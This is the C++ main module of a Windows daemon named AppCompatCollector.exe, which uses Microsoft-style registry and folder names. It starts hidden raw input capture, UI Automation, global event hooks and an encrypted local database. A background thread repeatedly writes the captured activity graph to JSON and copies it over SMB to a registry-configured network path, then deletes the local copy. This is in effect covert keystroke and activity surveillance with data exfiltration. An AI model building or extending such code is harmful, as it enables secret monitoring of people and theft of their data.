#include "hwagd_structs.h"
#include "GraphBuilder.h"
#include "MonitoringTimer.h"
#include <windows.h>
#include <thread>
#include <fstream>
#include <sqlcipher/sqlite3.h>
#include <atomic>
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

// Forward declarations from other modules
extern void InitializeRawInputEngine();
extern void InitializeUIA();
extern void RegisterEventHooks();
extern void ShutdownUIA();
extern void InitializeSecureStorage(sqlite3** db);
extern void CryptographicErase();
extern void ExecuteAtomicSMBEgress(const std::wstring& localPayloadPath, const std::wstring& targetUncPath);
extern DWORD WINAPI CorrelationThreadProc(LPVOID lpParam);

// The single SQLite database handle
sqlite3* g_db = nullptr;
std::atomic<bool> g_bRunning{true};  // Fixed: was volatile bool
HANDLE g_hShutdownEvent = NULL;      // Shared shutdown event for graceful termination

// Read configurable SMB egress path from registry
std::wstring GetEgressUNCPath() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\CompatRuntime",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        WCHAR value[512] = {0};
        DWORD size = sizeof(value);
        if (RegGetValueW(hKey, NULL, L"EgressUNCPath", RRF_RT_REG_SZ, NULL, value, &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return value;
        }
        RegCloseKey(hKey);
    }
    // Fallback: local export directory
    CreateDirectoryW(L"C:\\ProgramData\\ApplicationCompatibility\\export", NULL);
    return L"C:\\ProgramData\\ApplicationCompatibility\\export\\";
}

// Background egress thread - serializes graph to SQLite and SMB every 60 minutes
DWORD WINAPI EgressThreadProc(LPVOID lpParam) {
    (void)lpParam;
    while (g_bRunning.load()) {
        // Wait 5 seconds or until shutdown is signaled
        DWORD waitResult = WaitForSingleObject(g_hShutdownEvent, 5000);
        if (waitResult == WAIT_OBJECT_0) {
            // Shutdown signaled - do one final egress before exiting
        }

        if (!g_db) continue;

        // Serialize the current in-memory graph to JSON and SQLite
        std::string json = FlushGraphToSQLiteAndJSON(g_db);
        
        // Check for empty graph
        try {
            // If the JSON has no nodes and no edges, skip
            if (json.find("\"nodes\": []") != std::string::npos &&
                json.find("\"edges\": []") != std::string::npos) {
                if (waitResult == WAIT_OBJECT_0) break;
                continue;
            }
        } catch (...) {
            if (waitResult == WAIT_OBJECT_0) break;
            continue;
        }

        // Write JSON payload to local SQLite for crash recovery
        const char* sql = "INSERT INTO graph_batches (timestamp, payload_json) VALUES (?, ?);";
        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(g_db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
            sqlite3_bind_int64(stmt, 1, GetTickCount64());
            sqlite3_bind_text(stmt, 2, json.c_str(), -1, SQLITE_STATIC);
            sqlite3_step(stmt);
            sqlite3_finalize(stmt);
        }

        // Write JSON payload to local temp file for SMB egress
        std::wstring localPayload = L"C:\\ProgramData\\ApplicationCompatibility\\payload_";
        localPayload += std::to_wstring(GetTickCount64()) + L".json";
        std::ofstream out(localPayload, std::ios::binary);
        out << json;
        out.close();

        // Atomic SMB egress to configurable target
        std::wstring targetUnc = GetEgressUNCPath();
        targetUnc += std::to_wstring(GetTickCount64()) + L".json";
        ExecuteAtomicSMBEgress(localPayload, targetUnc);

        // Clean up local temp file
        DeleteFileW(localPayload.c_str());

        // If shutdown was signaled, exit after final egress
        if (waitResult == WAIT_OBJECT_0) break;
    }
    return 0;
}

// Main entry point for the AppCompatCollector.exe daemon
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    // Create shared shutdown event (manual reset, initially non-signaled)
    g_hShutdownEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!g_hShutdownEvent) return 1;

    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Phase 0: Check monitoring timer - bypass for dev test
    // if (!InitializeMonitoringTimer(g_hShutdownEvent)) {
    //     CloseHandle(g_hShutdownEvent);
    //     return 0; // Monitoring period complete - exit cleanly
    // }

    // Phase 1: Initialize encrypted local storage
    InitializeSecureStorage(&g_db);

    // Phase 2: Start the STA thread for UI Automation operations
    InitializeUIA();
    // Allow the STA thread to initialize and create the UIA client
    Sleep(500);

    // Phase 3: Register global WinEvent hooks (runs on the main thread)
    RegisterEventHooks();

    // Phase 4: Initialize the raw input capture engine (hidden message-only window)
    InitializeRawInputEngine();

    // Phase 5: Start the background egress thread
    CreateThread(NULL, 0, EgressThreadProc, NULL, 0, NULL);

    // Phase 5b: Start the background temporal correlation thread (MinHash Engine)
    CreateThread(NULL, 0, CorrelationThreadProc, NULL, 0, NULL);

    // Phase 6: Start the monitoring timer thread
    CreateThread(NULL, 0, MonitorTimerThreadProc, (LPVOID)g_hShutdownEvent, 0, NULL);

    // Enter the Windows message loop - keeps the daemon alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    g_bRunning.store(false);
    SetEvent(g_hShutdownEvent); // Signal all threads to stop
    Sleep(2000); // Give threads time to complete final operations
    ShutdownUIA();
    if (g_db) {
        sqlite3_close(g_db);
        g_db = nullptr;
    }
    CloseHandle(g_hShutdownEvent);

    Gdiplus::GdiplusShutdown(gdiplusToken);
    return 0;
}
